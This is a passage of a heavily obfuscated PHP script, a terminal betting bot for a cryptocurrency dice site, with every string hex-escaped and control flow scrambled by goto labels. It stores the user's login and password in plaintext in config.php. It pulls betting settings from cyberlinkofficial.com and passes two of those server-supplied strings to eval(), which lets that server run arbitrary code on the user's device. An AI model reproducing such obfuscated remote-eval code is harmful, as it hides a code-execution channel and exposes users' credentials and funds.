<?php goto zOQ5O; POC0e: $startTime = new DateTime(); goto v0TlL; DCbBb: $handleLogin = 
fopen("\160\150\x70\72\x2f\57\x73\164\x64\x69\156", "\x72"); goto bkBbO; PtPzv: $red = "\x1b\133\x30\x3b\x33\x31\155"; goto f0_rW; T1AoF: 
$betsetListJson = json_encode($betsetList["\x72\x65\143\157\x72\144\163"], true); goto FSE2X; Snhpi: function addBestsetStat($id) { $stat 
= 
apiWeb("\x68\x74\x74\x70\x73\72\57\x2f\x63\x79\x62\145\x72\154\151\x6e\x6b\157\146\146\151\x63\x69\141\x6c\56\143\x6f\x6d\57\x61\160\151\x2f\151\156\x64\145\x78\x2e\160\150\160\57\x72\x65\x63\x6f\162\144\x73\57\142\145\x74\163\145\164\137\163\x74\x61\164\57" 
. $id . '')["\x73\164\x61\164"]; $data_array = array("\163\x74\x61\x74" => (int) $stat + (int) 1); $update_plan = callAPI("\120\125\124", 
"\x68\164\x74\x70\x73\x3a\57\57\x63\171\x62\145\x72\x6c\151\x6e\x6b\157\x66\x66\151\143\151\141\x6c\x2e\143\x6f\155\x2f\x61\x70\x69\57\x69\x6e\x64\145\170\56\x70\x68\x70\57\x72\145\143\157\162\x64\x73\57\x62\145\x74\163\x65\x74\137\x73\x74\x61\164\57" 
. $id, json_encode($data_array)); } goto NiyvV; x5sjk: error_reporting(0); goto hBtpH; gzC2z: $yellow = "\x1b\133\x30\73\63\63\x6d"; goto 
YgRTt; YoPA3: if ($response["\162\145\x63\x6f\x72\144\x73"] != null && 
$response["\x72\145\x63\157\x72\144\x73"][0]["\x73\x74\x61\x74\x75\163"] == 1 && 
$response["\162\145\143\157\x72\144\163"][0]["\145\170\160\x5f\x64\141\x74\x65"] > date("\x59\x2d\155\55\144")) { $premiumMember = 0; echo 
"{$green}\127\145\x6c\143\x6f\x6d\145\40" . $response["\x72\145\x63\x6f\162\x64\x73"][0]["\x6e\x61\x6d\x65"] . 
"\x2c\x20\133\x50\162\145\x6d\151\x75\x6d\40\115\x65\x6d\x62\x65\x72\135\xa"; echo 
"{$green2}\x2d\x2d\55\x2d\55\x2d\x2d\55\x2d\55\x2d\x2d\55\x2d\x2d\x2d\55\55\x2d\55\55\55\x2d\x2d\55\x2d\x2d\x2d\55\x2d\55\55\55\55\x2d\55\55\x2d\55\xa"; 
echo "{$green2}\x54\141\156\147\x67\x61\154\40\72\40" . date("\144\55\x4d\x2d\x79") . "\x20\x7c" . 
"\40\111\x6e\147\141\x74\40\x49\x62\x61\144\141\x68" . "\xa"; echo "{$green2}\x54\x69\155\x65\x20\x20\x20\x20\x3a\40" . 
date("\x48\72\x69\x3a\163") . "\x20\40\x7c" . "\40\112\141\x6e\147\x61\156\40\114\165\160\x61\x20\x57\141\x6b\x74\165" . "\12"; echo 
"{$green2}\55\55\x2d\55\55\x2d\55\55\x2d\55\x2d\55\x2d\x2d\x2d\55\x2d\x2d\55\x2d\x2d\x2d\x2d\55\x2d\x2d\x2d\55\x2d\x2d\x2d\x2d\55\x2d\x2d\55\55\55\55\xa"; 
sleep(1); echo 
"{$yellow}\x28\x21\x29\x44\157\156\x27\x74\40\106\x6f\x72\147\145\164\40\164\157\x20\123\x75\x62\x73\x63\162\x69\142\x65\40\141\156\x64\40\114\x69\x6b\x65\40\157\x75\162\x20\x59\157\x75\164\x75\142\x65\40\103\150\x61\156\156\x65\x6c\x28\x21\51\12"; 
} else { echo "{$red}\127\x65\x6c\x63\x6f\x6d\x65\40" . $api_response_decoded["\x41\x63\143\157\x75\156\164\111\144"] . 
"\54\x20\133\x52\x65\x67\x75\x6c\141\x72\x20\x4d\x65\155\142\x65\162\135\xa"; echo 
"{$green2}\x2d\55\55\x2d\55\x2d\55\55\55\x2d\55\x2d\55\x2d\55\55\55\x2d\55\x2d\55\55\55\x2d\x2d\55\55\x2d\55\x2d\55\x2d\x2d\55\x2d\x2d\55\55\55\12"; 
echo "{$green2}\124\x61\x6e\x67\x67\141\x6c\x20\72\x20" . date("\x64\55\x4d\x2d\x79") . "\x20\x7c" . 
"\40\111\156\x67\x61\164\x20\x49\x62\x61\x64\x61\150" . "\12"; echo "{$green2}\x54\x69\x6d\145\40\40\40\40\72\x20" . 
date("\x48\72\151\72\163") . "\40\x20\x7c" . "\x20\x4a\x61\x6e\147\141\x6e\x20\x4c\x75\160\x61\x20\127\x61\x6b\x74\165" . "\xa"; echo 
"{$green2}\55\x2d\55\55\x2d\55\x2d\55\x2d\55\55\x2d\55\55\55\x2d\55\x2d\55\55\55\55\x2d\x2d\x2d\x2d\55\x2d\x2d\x2d\55\55\55\55\x2d\x2d\x2d\55\x2d\12"; 
sleep(1); echo 
"{$yellow}\x28\41\x29\104\157\156\x27\x74\x20\x46\x6f\162\x67\145\x74\x20\164\157\x20\123\x75\x62\x73\x63\x72\151\142\x65\40\x61\x6e\x64\x20\114\x69\x6b\145\40\157\165\x72\x20\131\157\165\164\165\142\145\x20\103\x68\x61\156\x6e\x65\154\x28\x21\x29\xa"; 
} goto QFmGk; n9Mdw: $get_data = callAPI("\x47\x45\124", 
"\150\164\x74\160\163\72\x2f\x2f\x63\x79\142\x65\x72\154\151\156\153\157\x66\x66\x69\143\x69\x61\x6c\56\143\x6f\x6d\x2f\x61\x70\151\x2f\x69\156\x64\x65\170\x2e\160\x68\160\x2f\162\x65\x63\x6f\x72\x64\163\57\x70\162\145\x6d\x69\165\155\x5f\x6d\x65\x6d\142\145\x72\x3f\146\x69\x6c\x74\145\162\x3d\x6d\145\155\x62\x65\x72\137\x69\144\x2c\145\x71\54" 
. $api_response_decoded["\x41\143\143\x6f\165\156\164\x49\144"], false); goto Ux9D1; TNjk2: echo 
"{$red}\xe2\226\210\342\x96\x88\xe2\x96\x88\342\226\x88\342\x96\x88\342\x96\210\342\x96\210\xe2\x96\x88\xe2\226\x88\xe2\226\x88\342\x96\x88\xe2\x96\210\342\226\210\xe2\x96\210\342\226\210\xe2\226\x88\342\x96\210\342\x96\210\342\x96\x88\342\226\210\xe2\x96\210\xe2\226\210\xe2\x96\210\xe2\x96\210\342\226\x88\xe2\226\x88\342\226\x88\xe2\226\x88\xe2\x96\210\xe2\226\210\xe2\226\210\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\342\226\210\xe2\226\x88\xe2\x96\x88\xe2\x96\210\342\x96\210\xe2\x96\x88\xe2\226\210\xe2\x96\210\342\x96\x88\342\x96\x88\xe2\226\x88\xe2\x96\x88\342\x96\x88\xe2\226\x88\342\226\210\xe2\226\x88\342\226\210\xe2\226\210\342\x96\210\xe2\226\210\xe2\226\x88\xe2\226\x88\342\x96\x88\xe2\x96\x88\342\x96\210\xe2\226\210\342\226\x88\xe2\226\x88\342\x96\210\xe2\226\210\342\x96\210\xe2\x96\210\342\x96\x88\342\226\x88\xe2\x96\210\342\x96\210\342\226\210\x20\xa\12"; 
goto a1OWn; kOTnM: $blue2 = "\33\x5b\x31\73\x33\x34\155"; goto kfeKD; lZj6W: foreach ($someArray as $key => $value) { echo "\x20\x20" . 
$value["\x6f\x72\x64\x65\162"] . "\56\40" . $value["\156\141\155\145"] . "\x20\x28\165\163\145\144\72\x20" . $value["\163\x74\x61\x74"] . 
"\170\x29\xa"; } goto kmEWn; ZCIvU: $balances = $getBalance["\x42\x61\154\x61\x6e\143\145\x73"]; goto c3Yzl; cDsHo: $get_data = 
callAPI("\x47\105\124", 
"\150\164\164\x70\x73\x3a\x2f\x2f\x63\171\142\x65\x72\x6c\151\x6e\x6b\x6f\146\x66\151\x63\x69\141\x6c\56\x63\x6f\x6d\57\141\160\151\x2f\151\156\144\x65\x78\x2e\x70\150\x70\x2f\162\x65\x63\x6f\162\144\163\x2f\x73\x63\137\x73\x74\x61\x74\x2f\62", 
false); goto g29_N; v0TlL: $initBalance = startBalance($currencyopt); goto d3aL7; abj8X: $betSetOptcoin = fgets($handlecoin); goto tSPFd; 
HY4JO: echo 
"{$red2}\40\40\x20\12\x20\x5f\137\x5f\x5f\x5f\137\137\x5f\40\x20\40\x20\x20\40\40\40\x20\40\x20\x5f\137\x5f\137\x5f\x20\x20\x20\x20\40\x20\40\40\40\40\x20\137\137\x5f\x5f\137\x20\40\40\x20\40\12\174\134\40\40\x5f\x5f\x5f\x20\x20\x5c\40\40\x20\40\40\40\x20\x20\x20\x2f\x20\x5f\137\x20\x20\x5c\40\40\x20\x20\x20\40\40\x20\x20\x2f\x20\137\x5f\40\x20\134\40\40\x20\x20\xa\134\x20\x5c\137\137\x5f\137\40\x20\40\x5c\40\40\40\x20\x20\40\40\x7c\134\57\x5f\x7c\134\40\x20\x5c\x20\x20\x20\x20\40\x20\40\174\134\x2f\137\x7c\x5c\x20\40\134\40\40\x20\xa\40\134\174\137\x5f\x5f\x5f\x7c\x5c\x20\40\134\40\40\x20\x20\x20\x20\134\174\x2f\40\134\40\134\40\40\134\40\x20\40\40\x20\x20\134\174\57\x20\x5c\x20\134\40\x20\x5c\40\x20\12\x20\40\40\40\40\137\137\134\137\134\40\40\134\x20\40\x20\x20\40\40\x20\x20\x20\x20\134\40\134\40\40\134\x20\x20\x20\x20\x20\x20\x20\x20\40\40\x5c\40\134\40\40\x5c\40\xa\40\x20\40\40\x7c\134\x5f\137\x5f\x5f\137\x5f\x5f\x5c\40\x20\40\x20\40\x20\x20\x20\40\40\x5c\40\x5c\137\137\x5c\x20\x20\x20\x20\x20\x20\x20\40\40\40\134\40\x5c\137\137\x5c\12\x20\x20\40\x20\x5c\174\x5f\x5f\137\x5f\137\137\x5f\x7c\40\40\40\x20\x20\40\40\40\40\40\40\134\174\137\x5f\x7c\x20\40\40\40\x20\x20\40\x20\40\x20\x20\x5c\174\x5f\x5f\x7c\40\12"; 
goto MyO1Y; RKQfh: echo "\xa\40\x53\x74\141\162\x74\40\102\141\154\141\156\143\145\72\x20" . number_format($initBalance / 100000000, 8) . 
"\x20" . $currencyopt . "\xa"; goto ty6gq; zOQ5O: set_time_limit(0); goto x5sjk; phil3: $lblue = "\x1b\133\x30\73\63\66\x6d"; goto OHfnJ; 
d3aL7: $dumpBalance = startBalance($currencyopt); goto tdOQt; vYBw4: system("\143\x6c\x65\141\162"); goto QzT0f; DDo_K: MAINMENU: goto 
vYBw4; d0r1A: $handlecoin = fopen("\x70\x68\x70\x3a\57\57\163\x74\x64\x69\x6e", "\162"); goto abj8X; RJ8f4: if 
(isset($api_response_decoded["\x4c\157\147\x69\156\111\x6e\x76\141\x6c\x69\x64"])) { echo 
"\xa\124\150\x65\40\165\x73\x65\162\x6e\x61\x6d\x65\x20\167\141\163\x20\x6e\157\164\x20\146\157\x75\x6e\144\x20\x6f\162\x20\x74\x68\145\x20\x70\x61\163\163\x77\x6f\162\144\40\151\163\x20\x77\x72\157\156\x67\12"; 
die; } goto zag05; N1ue9: echo 
"{$red}\x20\x20\40\x20\x20\x20\x20\40\x20\x20\40\x20\40\x20\40\x20\x20\x20\x20\40\40\75\x3d\75\75\75\75\x3d\x3d\x3d\x3d\75\40\75\75\x3d\x3d\x3d\75\75\x3d\x3d\75\12\12"; 
goto EpSNH; O4Zsi: function getStr($string, $start, $end) { $str = explode($start, $string, 2); $str = explode($end, $str[1], 2); return 
$str[0]; } goto gyYix; OSh1m: echo "\xa\xa"; goto MLLvB; mCdj2: function callAPI($method, $url, $data) { $curl = curl_init(); switch 
($method) { case "\x50\x4f\123\x54": curl_setopt($curl, CURLOPT_POST, 1); if ($data) { curl_setopt($curl, CURLOPT_POSTFIELDS, $data); } 
break; case "\x50\125\x54": curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "\x50\125\124"); if ($data) { curl_setopt($curl, CURLOPT_POSTFIELDS, 
$data); } break; default: if ($data) { $url = sprintf("\45\163\x3f\45\x73", $url, http_build_query($data)); } } curl_setopt($curl, 
CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_HTTPHEADER, 
array("\x43\157\156\164\145\x6e\x74\55\x54\x79\160\145\72\x20\141\x70\x70\154\151\143\x61\x74\151\x6f\x6e\57\x6a\163\157\x6e")); 
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_HTTPAUTH, CURLAUTH_BASIC); $result = curl_exec($curl); if 
(!$result) { die("\x43\157\x6e\x6e\x65\x63\164\x69\157\156\x20\106\x61\151\x6c\x75\x72\145"); } curl_close($curl); return $result; } goto 
O4Zsi; p12iU: $sound = trim(preg_replace("\x2f\134\x73\x5c\x73\53\x2f", "\40", fgets($handleSound))); goto aA5ux; WUA4b: COIN: goto mtgtq; 
WhBf0: $betSetOpt = fgets($handle); goto Snhpi; QFmGk: if ($ReferredById != "\x33\62\x39\x31\65\x39\63\71\60") { echo 
"\131\157\165\162\x20\141\x63\143\x6f\x75\x6e\x74\40\151\x73\40\156\157\164\40\x72\145\x67\x69\x73\164\145\x72\145\x64\40\x61\x73\40\x6f\x75\162\40\x6d\x65\x6d\x62\x65\162\x2e\12\120\154\145\x61\x73\145\x20\x72\145\147\151\x73\x74\x65\162\40\141\147\x61\151\156\40\151\x6e\x20\150\x65\x72\145\72\12"; 
CREATEACCOUNT: echo "{$blue2}\75\75\x3d\75\x3d\75\75\75\x52\x45\107\111\123\124\122\x41\124\x49\x4f\x4e\x3d\x3d\75\75\x3d\75\x3d\75\12"; 
echo "\40\165\163\145\162\156\141\x6d\x65\x3a\40"; $handleU = fopen("\160\150\160\72\x2f\57\163\164\144\x69\156", "\x72"); $username = 
trim(preg_replace("\x2f\134\x73\x5c\163\53\x2f", "\x20", fgets($handleU))); echo "\40\160\x61\163\x73\x77\157\162\x64\72\40"; $handleP = 
fopen("\160\150\160\x3a\x2f\x2f\x73\164\144\x69\156", "\x72"); $password = trim(preg_replace("\57\134\163\x5c\x73\x2b\57", "\x20", 
fgets($handleP))); $createAcc = "\141\75\103\x72\x65\141\164\x65\101\143\x63\157\x75\x6e\164\x26\x4b\145\171\x3d" . $apiKey . ''; 
$apicreateAcc = json_decode(feature($url, $createAcc), true); $createUserCookies = 
$apicreateAcc["\123\145\163\x73\151\x6f\x6e\103\x6f\157\153\x69\145"]; $createUser = 
"\x61\75\x43\x72\x65\x61\164\145\125\x73\x65\x72\x26\x73\75" . $createUserCookies . "\x26\x55\x73\145\162\156\141\x6d\145\75" . $username 
. "\x26\x50\x61\163\163\x77\x6f\162\144\75" . $password . ''; $api_CreateUser = json_decode(feature($url, $createUser), true); if 
(isset($api_CreateUser["\125\163\145\x72\156\x61\155\x65\124\x61\153\x65\x6e"])) { echo 
"\xa\x54\150\145\x20\x75\163\145\162\156\141\x6d\145\x20\x69\x73\40\x61\x6c\162\145\x61\144\x79\x20\x74\x61\153\145\156\x20\142\x79\40\163\157\155\x65\x6f\156\145\x20\x65\x6c\x73\x65\12"; 
die; } else { echo "\141\143\x63\157\x75\156\x74\40\163\165\143\143\x65\x73\x73\146\x75\154\154\x79\x20\143\x72\145\141\x74\x65\144\xa"; } 
$fp = fopen("\x63\157\156\x66\x69\x67\56\x70\x68\x70", "\x77"); fwrite($fp, "\74\77\x70\150\160" . "\12"); fwrite($fp, 
"\x24\165\163\x65\162\x20\75\40\x22" . $username . "\42\73" . "\12"); fwrite($fp, "\44\160\x77\x20\x3d\x20\42" . $password . "\x22\x3b" . 
"\12"); fwrite($fp, "\x3f\x3e"); fclose($fp); goto MAINMENU; } goto sOAH3; sOAH3: $getBalanceData = 
"\x61\75\107\145\x74\102\141\154\141\x6e\143\145\x73\46\163\75" . $userCookies . ''; goto JrnI5; y1X3G: if ($premiumMember == 0) { echo 
"\12\75\x3d\75\x3d\x3d\x3d\75\75\75\x50\x72\145\155\x69\x75\155\40\x4d\x65\x6d\142\x65\x72\x20\x53\x65\164\164\x69\x6e\x67\x3d\75\x3d\x3d\75\75\75\75\75\12"; 
if ($giveaway != 13) { echo 
"\xa\123\x65\164\x20\171\157\x75\162\x20\167\141\x6c\x6c\x65\x74\40\141\x64\144\162\x65\x73\x73\x2f\x61\x63\143\x6f\165\x6e\164\40\x49\x44\x20\164\x6f\x20\x57\151\x74\x68\x64\162\141\x77\x3a\x20"; 
$handleAddr = fopen("\x70\150\160\x3a\x2f\57\163\x74\144\x69\156", "\x72"); $wdAddr = trim(preg_replace("\57\x5c\x73\x5c\163\x2b\x2f", 
"\x20", fgets($handleAddr))); echo 
"\x53\145\164\40\x41\x75\164\157\x20\x57\x44\40\124\x79\160\x65\x20\50\163\x65\164\x20\x31\72\x20\x73\x74\141\x74\151\143\x2c\x20\62\72\x20\x64\171\x6e\141\x6d\x69\x63\51\72\40"; 
$autoWdType = trim(preg_replace("\57\134\x73\x5c\163\53\x2f", "\40", fgets(fopen("\160\x68\x70\x3a\57\57\x73\x74\x64\151\156", "\162")))); 
if ($autoWdType == 1) { if ($currency == "\144\x6f\147\x65") { echo 
"\x53\x65\164\x20\141\x6d\157\165\156\164\x20\x74\157\x20\167\151\164\x68\x64\162\x61\167\40\x28\155\151\156\x69\x6d\x75\155\x20\x32\x2c\x20\x73\145\x74\40\x30\x20\x74\x6f\40\127\104\x20\141\154\x6c\51\72\40"; 
$handleAm = fopen("\x70\150\x70\72\57\57\163\164\x64\x69\156", "\162"); $wdAm = trim(preg_replace("\x2f\x5c\163\134\163\53\57", "\x20", 
fgets($handleAm))); } elseif ($currency == "\142\x74\x63") { echo 
"\x53\x65\x74\40\x61\155\x6f\x75\156\x74\40\164\157\40\x77\x69\164\150\144\x72\141\x77\40\x28\x6d\x69\156\x69\155\x75\x6d\x20\60\56\60\60\60\62\54\40\163\x65\x74\x20\60\40\x74\x6f\x20\x57\x44\x20\141\x6c\154\x29\72\x20"; 
$handleAm = fopen("\x70\x68\160\x3a\57\57\163\x74\144\x69\x6e", "\162"); $wdAm = trim(preg_replace("\57\x5c\163\134\163\x2b\57", "\40", 
fgets($handleAm))); } elseif ($currency == "\154\x74\143") { echo 
"\x53\145\x74\40\x61\x6d\x6f\165\156\164\40\x74\157\40\167\x69\164\x68\x64\x72\x61\x77\40\x28\155\151\156\x69\x6d\165\155\x20\60\56\60\60\x32\54\x20\163\145\x74\x20\60\x20\x74\157\40\x57\x44\40\x61\154\154\51\72\40"; 
$handleAm = fopen("\x70\150\160\x3a\x2f\x2f\x73\x74\144\x69\156", "\162"); $wdAm = trim(preg_replace("\x2f\134\x73\x5c\x73\x2b\x2f", 
"\40", fgets($handleAm))); } elseif ($currency == "\x65\x74\150") { echo 
"\x53\x65\x74\x20\x61\x6d\157\x75\156\x74\x20\164\157\40\x77\151\x74\150\144\162\x61\167\40\50\155\151\156\151\x6d\x75\x6d\x20\60\56\60\x30\x32\54\x20\163\x65\164\x20\x30\40\x74\x6f\x20\x57\104\40\x61\154\x6c\51\x3a\40"; 
$handleAm = fopen("\x70\150\160\x3a\x2f\57\163\x74\x64\x69\x6e", "\x72"); $wdAm = trim(preg_replace("\x2f\x5c\x73\134\x73\x2b\x2f", "\40", 
fgets($handleAm))); } $autoWdPercent = 0; } else { $wdAm = 0; echo 
"\x53\x65\x74\x20\x61\155\157\x75\x6e\x74\x20\x74\x6f\x20\167\x69\164\x68\x64\x72\141\167\40\50\151\156\40\x25\x2c\x20\155\x69\x6e\151\155\165\155\x20" 
. ceil(200000000 / startBalance($currencyopt) * 100) . "\x29\x3a\40"; $autoWdPercent = trim(preg_replace("\x2f\x5c\x73\134\163\x2b\57", 
"\x20", fgets(fopen("\x70\150\x70\x3a\x2f\x2f\x73\x74\x64\x69\156", "\x72")))); } echo 
"\x44\157\x20\x79\x6f\165\x20\167\141\x6e\x74\40\x74\x6f\40\x64\x6f\x6e\141\164\145\x20\171\157\165\40\146\x69\162\163\x74\40\x41\x75\164\x6f\127\x44\40\x74\x6f\x20\x4f\x43\x59\x4c\x20\x28\61\72\x59\145\163\54\40\x30\x3a\116\x6f\51\72\x20"; 
$donateDev = trim(preg_replace("\57\134\163\134\163\x2b\x2f", "\x20", fgets(fopen("\160\x68\x70\72\57\57\163\164\x64\151\156", "\x72")))); 
} else { if ($currency == "\144\157\x67\145") { echo 
"\123\145\x74\x20\141\x6d\157\165\156\x74\40\x74\x6f\x20\x67\x69\x76\x65\x61\167\141\171\40\x28\155\x69\x6e\x69\x6d\165\x6d\40\62\x29\x3a\x20"; 
$handleAm = fopen("\x70\150\x70\x3a\x2f\x2f\163\164\144\x69\156", "\x72"); $wdAm = trim(preg_replace("\x2f\x5c\163\x5c\x73\x2b\x2f", 
"\x20", fgets($handleAm))); } elseif ($currency == "\142\x74\x63") { echo 
"\x53\x65\x74\x20\x61\x6d\x6f\x75\x6e\x74\x20\164\x6f\x20\147\151\166\145\x61\167\x61\171\x20\50\x6d\151\x6e\151\155\165\x6d\x20\60\56\60\x30\x30\62\51\x3a\40"; 
$handleAm = fopen("\x70\150\x70\72\57\x2f\163\164\x64\x69\156", "\162"); $wdAm = trim(preg_replace("\x2f\134\163\134\163\53\x2f", "\40", 
fgets($handleAm))); } elseif ($currency == "\x6c\164\x63") { echo 
"\123\x65\164\x20\141\x6d\x6f\165\x6e\x74\x20\164\157\x20\x67\151\166\x65\141\167\x61\171\x20\x28\x6d\151\x6e\x69\x6d\165\x6d\40\x30\x2e\x30\60\62\x29\x3a\x20"; 
$handleAm = fopen("\160\150\160\x3a\x2f\57\163\x74\x64\x69\x6e", "\162"); $wdAm = trim(preg_replace("\x2f\x5c\163\134\x73\x2b\57", "\x20", 
fgets($handleAm))); } elseif ($currency == "\145\164\x68") { echo 
"\123\145\x74\40\141\x6d\157\165\x6e\164\x20\164\x6f\x20\147\x69\x76\145\141\167\141\x79\x20\50\155\151\156\151\x6d\x75\155\x20\x30\x2e\60\60\x32\x29\x3a\40"; 
$handleAm = fopen("\160\150\160\x3a\x2f\57\x73\164\x64\151\x6e", "\x72"); $wdAm = trim(preg_replace("\x2f\134\163\x5c\x73\x2b\x2f", "\40", 
fgets($handleAm))); } } echo 
"\123\145\164\40\101\165\x74\x6f\40\x57\104\40\154\151\x6d\151\164\x20\x28\x6d\151\x6e\151\155\x75\155\x20\61\54\x20\x73\x65\x74\x20\60\x20\164\x6f\40\x75\x6e\154\x69\155\151\x74\x65\x64\51\72\x20"; 
$autoWdLimit = trim(preg_replace("\57\x5c\x73\x5c\x73\53\x2f", "\x20", fgets(fopen("\160\150\160\72\57\x2f\x73\164\144\x69\x6e", 
"\x72")))); echo 
"\123\x65\x74\x20\x74\x69\155\145\40\154\151\x6d\x69\164\40\50\x69\156\x20\163\145\x63\x6f\x6e\144\54\40\163\145\x74\40\x30\x20\164\157\x20\x75\156\154\x69\155\151\x74\x65\x64\51\x3a\40"; 
$timeLimit = trim(preg_replace("\x2f\x5c\x73\x5c\x73\x2b\x2f", "\40", fgets(fopen("\x70\150\x70\72\57\57\x73\x74\144\x69\156", "\162")))); 
echo 
"\x53\x65\164\x20\x53\x74\x6f\160\x20\164\162\x61\144\x65\40\x77\150\145\156\x20\x42\141\154\141\x6e\143\145\40\x6c\145\x73\x73\x20\x74\150\x61\156\x20\x28\151\156\x20\45\54\x20\163\145\164\x20\x30\x20\164\157\40\x75\156\154\x69\155\151\164\145\144\x29\72\40"; 
$StopMinBalance = trim(preg_replace("\x2f\x5c\163\134\163\x2b\x2f", "\40", fgets(fopen("\160\150\160\72\x2f\57\163\x74\x64\x69\x6e", 
"\x72")))); echo 
"\x53\x65\164\40\x50\x72\x6f\x66\x69\x74\40\x54\141\162\x67\x65\164\40\x28\151\156\40\x25\54\x20\163\x65\164\x20\60\x20\164\x6f\40\165\156\x6c\x69\155\151\164\x65\x64\x29\72\40"; 
$StopMaxBalance = trim(preg_replace("\x2f\134\163\134\x73\x2b\x2f", "\x20", fgets(fopen("\x70\150\x70\72\x2f\x2f\x73\164\144\151\x6e", 
"\x72")))); echo 
"\123\x65\164\40\122\x61\156\144\157\x6d\x20\110\x69\x2f\x4c\157\x77\x20\50\x31\x20\146\157\162\40\171\145\163\x2c\40\x30\40\x66\157\162\x20\x6e\x6f\51\72\x20"; 
$randomHiLow = trim(preg_replace("\x2f\134\x73\134\163\53\x2f", "\x20", fgets(fopen("\160\x68\x70\x3a\x2f\x2f\x73\x74\x64\151\156", 
"\x72")))); } goto XSOoh; vCQUV: $userClientSeed = $api_response_decoded["\x43\x6c\151\145\156\x74\123\145\145\x64"]; goto BG4vx; FSE2X: 
$someArray = json_decode($betsetListJson, true); goto lZj6W; r_ptF: $scriptId = 
"\x78\x77\x74\x47\x41\162\x7a\171\141\x55\166\151\143\x62\131\130\111\x47\x6b\x4a"; goto OebYr; TXruR: BANNER: goto S6NQW; jO_w3: if 
($login == "\x59" || $login == "\x79") { goto LOGINEX; } else { LOGINNEW: echo "\x20\x55\163\x65\162\x6e\141\x6d\145\x3a\x20"; $handleUser 
= fopen("\x70\150\x70\x3a\x2f\57\163\x74\144\151\x6e", "\x72"); $user = trim(preg_replace("\57\134\x73\134\x73\53\x2f", "\x20", 
fgets($handleUser))); echo "\x20\x50\141\x73\x73\x77\x6f\x72\144\72\40"; $handlePass = 
fopen("\x70\x68\x70\72\x2f\x2f\x73\164\144\151\x6e", "\x72"); $pass = trim(preg_replace("\57\134\163\x5c\x73\53\x2f", "\40", 
fgets($handlePass))); echo 
"\40\x47\157\x6f\x67\154\x65\40\x41\165\x74\x68\x65\156\x74\x69\143\141\164\x6f\162\40\x23\x20\x28\x6c\145\141\x76\145\x20\151\164\x20\142\x6c\x61\156\153\x20\151\x66\x20\171\x6f\x75\40\x6e\157\164\x20\165\x73\x69\156\147\x20\x69\164\51\x3a\x20"; 
$handletotp = fopen("\160\x68\160\72\x2f\x2f\x73\164\144\x69\x6e", "\x72"); $totp = trim(preg_replace("\57\x5c\x73\134\163\53\x2f", 
"\x20", fgets($handlePass))); $fp = fopen("\x63\157\156\146\x69\x67\56\x70\x68\x70", "\167"); fwrite($fp, "\74\77\x70\150\x70" . "\xa"); 
fwrite($fp, "\x24\165\x73\145\x72\40\x3d\40\x22" . $user . "\x22\73" . "\xa"); fwrite($fp, "\x24\x70\x77\40\75\40\x22" . $pass . "\x22\73" 
. "\xa"); fwrite($fp, "\77\x3e"); fclose($fp); } goto EnVHh; NiyvV: foreach ($someArray as $key => $value) { if 
($value["\157\x72\x64\x65\162"] == $betSetOpt) { if ($value["\x6e\141\155\145"] != "\115\x61\156\x75\x61\x6c") { $betset = 
apiWeb("\150\x74\164\x70\x73\x3a\x2f\57\x63\x79\x62\145\162\154\x69\156\153\157\146\146\x69\143\x69\141\x6c\56\x63\x6f\x6d\57\x61\160\x69\x2f\x69\x6e\144\x65\170\56\x70\x68\x70\57\x72\145\x63\x6f\162\x64\163\57\142\145\164\163\x65\x74\137\x73\164\141\164\x2f" 
. $value["\151\x64"] . '')["\x62\145\164\x73\145\x74"]; $premium = 
apiWeb("\150\164\x74\160\163\x3a\x2f\57\x63\x79\142\145\162\x6c\x69\x6e\x6b\x6f\146\x66\x69\x63\151\x61\x6c\x2e\x63\157\x6d\x2f\141\x70\151\x2f\151\x6e\144\x65\x78\x2e\160\x68\x70\57\x72\145\x63\157\162\144\163\x2f\142\145\164\x73\x65\164\137\163\164\x61\164\x2f" 
. $value["\x69\x64"] . '')["\x70\x72\145\x6d\x69\x75\155"]; $betsetJson = json_decode($betset, true); if ($premiumMember != 0 && $premium 
== 0) { echo 
"\124\x68\151\x73\x20\102\x65\164\x73\145\164\x20\x6f\156\154\171\40\146\x6f\x72\40\120\x72\x65\155\151\165\155\40\115\x65\x6d\142\145\162\x2e\40\120\154\x65\141\163\x65\x20\x4a\x6f\x69\x6e\x20\101\156\x64\40\163\x65\x6e\144\40\x61\x20\143\150\x61\164\40\124\157\40\x41\x64\155\x69\156\x20\x4f\x63\145\x61\156\x20\103\x79\142\145\162\40\x4c\x69\156\153\x20\111\x6e\x20\x57\x68\141\x74\x73\x41\160\x70\x20\107\x72\x6f\x75\160\12"; 
sleep(5); 
exec("\x74\x65\162\x6d\165\170\55\x6f\x70\x65\156\x2d\x75\162\x6c\40\150\164\x74\160\x73\72\x2f\x2f\x63\150\x61\x74\x2e\167\x68\141\164\163\141\160\x70\x2e\x63\157\x6d\x2f\x44\172\114\x52\123\x47\151\x55\x46\151\x69\70\125\x70\x78\x50\105\x37\x62\x34\67\x4b"); 
die; } $baseBetStr = $betsetJson["\x62\141\163\145\102\x65\164"]; $baseBet = eval("\162\x65\x74\165\x72\156\40" . $baseBetStr . "\x3b"); 
$low = $betsetJson["\154\x6f\167"]; $high = $betsetJson["\150\151\147\150"]; $maxBets = $betsetJson["\x6d\x61\x78\102\x65\164\x73"]; 
$resetOnWin = $betsetJson["\162\145\x73\145\164\x4f\156\127\151\x6e"]; $resetOnLose = 
$betsetJson["\162\x65\163\x65\164\117\x6e\x4c\157\163\145"]; $incPercentWin = 
$betsetJson["\x69\156\x63\120\145\162\143\x65\x6e\x74\127\151\156"]; $incPercentLose = 
$betsetJson["\x69\x6e\143\120\x65\162\x63\x65\x6e\164\114\157\163\145"]; $MaxPayInStr = $betsetJson["\x4d\141\170\x50\141\x79\111\156"]; 
$MaxPayIn = eval("\x72\x65\164\x75\x72\156\x20" . $MaxPayInStr . "\73"); $ResetOnLoseMaxBet = 
$betsetJson["\x52\x65\x73\x65\x74\x4f\x6e\114\157\163\145\x4d\141\170\x42\x65\x74"]; $StopOnLoseMaxBet = 
$betsetJson["\123\x74\157\160\117\156\x4c\x6f\x73\145\115\141\x78\x42\x65\x74"]; $currency = $currencyopt; $giveaway = $value["\x69\144"]; 
} else { MANUAL: echo "\12\12\40\x42\x61\x6c\141\x6e\x63\145\72\x20" . number_format(startBalance($currencyopt) / 100000000, 8) . "\40" . 
